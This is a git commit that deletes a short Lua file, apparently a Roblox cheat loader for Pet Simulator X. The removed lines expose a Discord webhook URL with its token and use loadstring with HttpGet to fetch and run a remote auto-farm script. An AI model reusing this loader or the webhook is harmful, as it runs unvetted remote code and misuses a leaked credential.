2e3c75cacb0000b7c9deb5fd8073f1c3a0d59626
P2W Games Scripts Publisher <97706619+hannah0355@users.noreply.github.com>
2022-12-25 23:34:34 -0300

    Delete projectwdgui.lua

--- projectwdgui.lua
+++
@@ -1,3 +0,0 @@
-_G.UserID = 2868305313
-_G.WebHook = "https://discord.com/api/webhooks/1056741653127385108/wlRI5rbWottS7thCgZIstPDonXKof1jBH9lu_-i_Vlt3Rf2n9fRol4F8H6dw0IfXq59q"
-loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))()
